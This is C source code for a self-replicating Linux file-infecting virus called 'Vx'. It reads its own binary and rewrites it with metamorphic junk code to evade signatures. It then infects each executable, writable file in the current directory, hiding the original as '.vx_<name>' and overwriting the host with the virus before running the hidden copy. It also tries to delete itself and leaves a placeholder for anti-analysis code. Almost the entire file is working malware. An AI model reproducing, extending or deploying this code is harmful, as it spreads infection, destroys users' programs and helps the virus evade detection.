#include "vx.h"

////////////////////////////////////////////////////////////////////////////////
/// VX 
////////////////////////////////////////////////////////////////////////////////

static unsigned char *code;
static size_t codelen;
static unsigned char *Vx;
static int first_run = 1;

static const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, JMP, JE, JZ, JNZ, CALL, RET, NOP, 0 };

// Some adorable ASCII
static const char *_art =
    "  / \\_/ \\ \n"
    " (  o.o  )\n"
    "   > ^ <   \n";

static int wr_in(unsigned reg, int offset, int space)
{
    if (space < 2)
    {
        code[offset] = NOP;
        return 1;
    }
    else
    {
        code[offset] = prefixes[rand() % (sizeof(prefixes) - 1)];
        
        // For control flow instructions
        if (code[offset] == JMP || code[offset] == JE || code[offset] == JZ || code[offset] == JNZ || code[offset] == CALL)
        {
            *(int*)(code + offset + 1) = rand();
            return 5;
        }
        else
        {
            // For other instructions, handle register usage or immediate values
            if (code[offset] != RET && code[offset] != NOP)
            {
                if (code[offset] >= ADD && code[offset] <= SUB)
                    code[offset + 1] = 0xC0 + rand() % 8 * 8 + reg;
                else
                    code[offset + 1] = rand();
            }
            return 2;
        }
    }
}


/* Read assembly instruction */
static int rd_in(unsigned reg, int offset)
{
    unsigned c1 = code[offset];
    if (c1 == NOP)
    {
        return 1;                       
    }
    if (c1 == MOV+reg)
    {
        return 5;                       
    }
    if (strchr(prefixes, c1))
    {
        // Read second instruction at offset
        unsigned c2 = code[offset+1];   
        if (c2 >= 0xC0 && c2 <= 0xFF && (c2&7) == reg)
        {
            return 2;                   
        }                               
        return 0;
    }
}

static void rp_junk(void)
{
    for (size_t i = 0; i < codelen - JUNKLEN - 1; i++)
    {
        unsigned start = code[i];
        unsigned end = code[i+JUNKLEN+1];
        unsigned reg = start - PUSH;

        // Check conditions for replacing junk code
        if (start < PUSH || start >= PUSH+8) continue;  
        if (end != POP+reg) continue;                   
        if (reg == 4) continue;

        int j = 0;                                          
        int junkLength = 0;
        int inc;
        while (inc = rd_in(reg, i+1+j)) {
            j += inc;
            junkLength += inc;
        }
        
        if (junkLength != JUNKLEN) continue;                     

        // Replace
        reg = rand() % 7;                                 
        reg += (reg >= 4);
        code[i] = PUSH + reg;                           
        code[i + JUNKLEN + 1] = POP + reg;                  

        // Generate new instructions
        int remainingSpace = JUNKLEN - junkLength;
        int k = 0;
        while (remainingSpace > 0)
        {
            inc = wr_in(reg, i + 1 + j + k, remainingSpace); 
            k += inc;
            remainingSpace -= inc;                               
        }
    }
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

static void* remote_thread(void *arg) {
    SELFDEL *remote = (SELFDEL *)arg;

    // pthread_join(pthread_self(), NULL);
    while (remote->fnUnlink(remote->FileName) != 0) {
        sleep(1);
    }

    remote->fnExit(0);
    return NULL;
}

int SelfDelete(const char *executableName) {
    SELFDEL local = {0};
    pid_t pid = fork();

    if (pid < 0) {
        return -1;
    } else if (pid == 0) {
        memcpy(local.FileName, executableName, strlen(executableName) + 1); // Copy executableName

        local.fnUnlink = unlink;
        local.fnExit = exit;

        // detached Here!
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
        pthread_t tid;

        if (pthread_create(&tid, &attr, remote_thread, &local) != 0) {
            perror("pthread_create failed");
            pthread_attr_destroy(&attr);
            exit(EXIT_FAILURE);
        }

        pthread_attr_destroy(&attr);
        sleep(1);

        exit(EXIT_SUCCESS);
    }

    return 0;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

/* Reads a standard file */
char* rd_file(const char *file_name)
{
    char *str;
    int strlen;

    FILE *fp = fopen(file_name, "r");   
    fseek(fp, 0L, SEEK_END);            
    strlen = ftell(fp);
    str = malloc(strlen);               
    fseek(fp, 0L, SEEK_SET);
    fread(str, strlen, 1, fp);          
    fclose(fp);

    return str;
}

/* Writes binary code to file */
void wr(const char *file_name) {
    FILE *fp = fopen(file_name, "wb");          
    fwrite(code, codelen, 1, fp);               
    fclose(fp);
}

/* Reads binary code from file */
void rd(const char *file_name) {
    FILE *fp = fopen(file_name, "rb");          
    fseek(fp, 0L, SEEK_END);                  
    codelen = ftell(fp);
    fseek(fp, 0L, SEEK_SET);                  
    code = malloc(codelen);                   
    fread(code, codelen, 1, fp);
    fclose(fp);
}

// ASCII
void _ascii_art() {
    printf("%s\n", _art);
}

/* Executes */
void exec(const char *bash_code, const char *file_name)
{
    int cmd_len = strlen(bash_code) + strlen(file_name) + 1;
    char cmd[cmd_len];                      

    sprintf(cmd, bash_code, file_name);     

    system(cmd);
}

/* hide */
void cp(const char *bash_code, const char *filename)
{
    int cmd_len = strlen(bash_code) + strlen(filename) + 1;
    char cmd[cmd_len];                      

    sprintf(cmd, bash_code, filename, filename);

    system(cmd);                            
}

/* Embeds */
void em(const char *file_name)
{
    cp("cp %s .vx_%s", file_name);    
    exec("chmod +x %s", file_name);                 

    wr(file_name);                                  
}


/* Propagates */
void prop(const char *path, const char *exclude) {
    DIR *dir;
    struct dirent *ent;

    // Open directory stream
    dir = opendir ("./");                                                                   
    if (dir != NULL) {
        // Iterate over all files in the current directory                  
        while ((ent = readdir (dir)) != NULL) {                                             
            // Select regular files only, not DT_DIR (directories) nor DT_LNK (links)       
            if (ent->d_type == DT_REG)
            {
                // Select executable and writable files that can be infected
                if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)      
                {
                    // i do not want hit myself
                    if (strstr(exclude, ent->d_name) != NULL)                              
                    {
                        Vx = ent->d_name;                                 
                    }
                    else if (strstr(ent->d_name, "vx") != NULL)                          
                    {
                        first_run = 0;                      
                    }
                    else
                    {
                        const char *bash_code = ".vx_%s";                                  
                        int hidden_file_len = strlen(bash_code) + strlen(ent->d_name) + 1; 
                        char hidden_file[hidden_file_len];  
                        sprintf(hidden_file, bash_code, ent->d_name);                       

                        if( access(hidden_file, F_OK) == -1 ) {
                            em(ent->d_name);        
                        }
                    }
                }
            }
        }

        closedir (dir);                                     

    } else {      
        exit (EXIT_FAILURE);
    }
}

////////////////////////////////////////////////////////////////////////////////
/// MAIN FUNCTION
////////////////////////////////////////////////////////////////////////////////

/* Vx */
int main(int argc, char* argv[])
{
    // !! Anti Goes Here 
    _ascii_art();                                      
    // Reads code into memory from currently running executable
    rd(argv[0]);                                         
    // Metamorphically changes the code in a random fashion
    rp_junk();                                         
    // Propagates the into other executables in the same directory
    prop("./", argv[0]);                               
    // Edge case to prevent an infinite loop during the first execution
    if (first_run == 1)
    {
        exec("touch .vx_%s", Vx);    
        exec("chmod +x .vx_%s", Vx);   
    }
    // Execute the original, hidden executable
    exec("./.vx_%s", Vx);
    SelfDelete(argv[0]); // or remove ))
    return 0;
}
